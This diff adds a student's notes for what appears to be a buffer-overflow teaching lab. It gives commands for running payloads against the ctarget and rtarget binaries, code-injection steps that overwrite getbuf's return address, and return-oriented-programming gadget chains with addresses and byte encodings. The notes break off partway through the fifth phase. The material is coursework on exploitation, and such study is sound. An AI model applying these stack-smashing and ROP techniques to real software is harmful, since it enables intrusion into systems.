@@ -1,0 +1,92 @@
+code:
+./hex2raw < ctargetN.txt | ./ctarget -q
+
+./hex2raw < ctarget1.txt > ctarget1-raw.txt
+./ctarget -qi ctarget1-raw.txt
+./ctarget ctarget1-raw.txt
+
+p/x $rsp
+
+gcc -c code.s
+objdump -d code.o > code.d
+
+objdump -d rtarget > rtarget.s
+
+90 means empty
+
+
+phase 1
+change the getbuf-ret-addr to t1-addr
+
+phase 2
+change the getbuf-ret-addr to getbuf-stack-top
+save the code at getbuf-stack-top
+
+code:
+    movq   cookie, %rdi
+    pushq  t2-addr 
+    ret 
+
+phase 3
+save the cookie at test-stack-top
+change the getbuf-ret-addr to getbuf-stack-top
+save the code at getbuf-stack-top
+
+code:
+    movq   cookie-addr, %rdi
+    pushq  t3-addr
+    ret
+
+phase 4
+code:
+    movq   cookie, %rdi
+    pushq  t2-addr 
+    ret 
+gadget:
+    popq %rax          #58  0x4019ab
+    ret                #c3
+    ##############
+    movq %rax %rdi     #48 89 c7  0x4019c5
+    ret                #c3
+
+find popq %rax addr
+find movq %rax %rdi addr
+save cookie at test-stack-top
+change the getbuf-ret-addr to popq-addr
+save movq-addr at test-stack-top-next1
+save t3-addr at test-stack-top-next2
+
+phase 5
+code:
+    movq   cookie-addr, %rdi
+    pushq  t3-addr
+    ret
+
+    # As the stack is random,how to save cookie and find its address ?
+
+gadget:
+    movq %rsp, %rax    #0x401aad
+
+    movq %rax, %rdi    #0x4019a2
+
+    popq %rax          #0x4019cc
+
+    movl %eax, %edx    #0x4019dd
+
+    movl %edx, %ecx    #0x401a70
+
+    movl %ecx, %esi    #0x401a13
+
+    lea (%rdi,%rsi,1),%rax  #0x4019d6
+
+    movq %rax, %rdi    #0x4019a2
+
+
+
+
+
+
+
+
+
+
